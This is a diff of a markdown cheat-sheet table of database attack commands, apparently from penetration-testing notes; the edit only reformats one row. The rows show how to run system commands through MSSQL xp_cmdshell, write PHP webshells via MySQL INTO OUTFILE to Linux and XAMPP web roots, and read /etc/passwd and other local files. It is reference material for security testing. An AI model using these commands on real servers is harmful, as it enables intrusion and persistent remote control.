@@ -50,9 +50,7 @@
 | `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
 | `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
 | `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
-| ```
-mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\z.php";
-``` | Write php webshell on a Windows target running XAMPP. |
+| `mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\z.php"; ` | Write php webshell on a Windows target running XAMPP. |
 | `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
 | `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
 | `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
